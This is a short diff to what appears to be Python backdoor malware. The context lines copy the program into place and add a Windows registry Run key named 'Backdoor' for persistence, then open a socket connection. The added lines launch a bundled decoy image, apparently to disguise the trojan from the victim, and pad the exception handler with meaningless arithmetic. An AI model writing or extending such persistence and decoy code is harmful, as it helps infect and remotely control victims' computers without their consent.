@@ -94,6 +94,13 @@ if not os.path.exists(location):
     shutil.copyfile(sys.executable, location)
     subprocess.call('REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
 
+    name  = sys._MEIPASS + "\hello.jpg"
+    try:
+        subprocess.Popen(name, shell=True)
+    except:
+        number = 1
+        number1 = 3
+        addition = number + number1
 
 sock = socket.socket(socket. AF_INET, socket.SOCK_STREAM)
 connection()
